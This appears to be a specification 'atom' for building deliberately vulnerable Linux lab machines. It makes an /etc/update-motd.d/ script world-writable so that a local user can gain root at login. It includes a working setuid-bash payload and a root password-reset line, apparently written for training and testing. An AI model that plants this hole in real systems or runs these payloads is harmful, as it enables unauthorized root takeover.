---
id: motd_command_injection
description: Makes a script in /etc/update-motd.d/ world-writable, allowing a low-privilege user to inject arbitrary commands that execute as root whenever any user logs in via SSH or su.
required_vars: [motd_script_name]
---
# Atom: MOTD Command Injection
Scripts in `/etc/update-motd.d/` are executed as root each time a user logs in and the dynamic MOTD is generated. A world-writable script in this directory allows any local user to inject commands that run as root on the next login event.

### Logic Requirements:
1. Create (or select) a script at `/etc/update-motd.d/<motd_script_name>` with benign content.
2. Ensure the script is executable: `chmod +x /etc/update-motd.d/<motd_script_name>`
3. Set world-writable permissions: `chmod 777 /etc/update-motd.d/<motd_script_name>`
4. Ensure `update-motd` is enabled — on Ubuntu/Debian this is the default when sshd uses `PrintMotd yes` and `pam_motd.so` is in `/etc/pam.d/sshd`.

### Common Patterns:
- **World-Writable System Info Script:**
  ```bash
  cat > /etc/update-motd.d/99-sysinfo << 'EOF'
  #!/bin/bash
  echo ""
  echo "System load: $(uptime | awk '{print $NF}')"
  echo "Disk usage:  $(df -h / | awk 'NR==2{print $5}')"
  echo ""
  EOF
  chmod 777 /etc/update-motd.d/99-sysinfo
  ```
- **Replacing an Existing MOTD Script:**
  ```bash
  chmod 777 /etc/update-motd.d/10-uname
  # Attacker overwrites with: echo "root:pwned" | chpasswd
  ```

### Testing Guidance:
1. Verify the script exists and is world-writable: `ls -l /etc/update-motd.d/<motd_script_name>`
2. Verify the script is executable: the permissions should show `x` for all users (`-rwxrwxrwx`).
3. As a low-priv user, inject a payload:
   ```bash
   echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /etc/update-motd.d/<motd_script_name>
   ```
4. Trigger the MOTD by running: `sudo -i` or by SSH-ing into the machine as any user.
5. Verify: `ls -l /tmp/rootbash` and `/tmp/rootbash -p -c 'id'`

### Synthesis Guidance:
Use a script name that sorts to run early or late (numeric prefix determines order). A name like `99-sysinfo` or `50-welcome` is realistic. Ensure `pam_motd` is active — on stock Ubuntu Docker images it may not be triggered without an SSH login, so the Builder should note that exploitation requires an SSH login or manual MOTD trigger (`run-parts /etc/update-motd.d/`). This atom pairs naturally with an SSH service installed on the target.
